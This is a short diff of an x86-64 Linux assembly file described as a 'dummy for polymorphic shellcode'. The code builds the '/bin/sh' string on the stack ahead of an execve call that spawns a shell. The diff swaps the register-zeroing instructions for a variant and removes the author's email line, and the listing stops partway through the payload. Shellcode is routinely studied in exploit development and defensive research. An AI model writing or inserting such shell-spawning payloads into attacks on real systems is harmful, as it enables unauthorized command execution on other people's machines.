@@ -1,11 +1,10 @@
 
 ; [Linux/X86-64]
-; Dummy for shellcode:
+; Dummy for polymorphic shellcode:
 ; execve("/bin/sh", ["/bin/sh"], NULL)
-; hophet [at] gmail.com
 _start:
-    xor    rax, rax
-    cdq ;zeros rdx
+    xor   rsi, rsi
+    mul   rsi
     mov  r9, 0x68732f6e69622fff
     shr r9, 0x8
     mov [rsp-0x8], r9
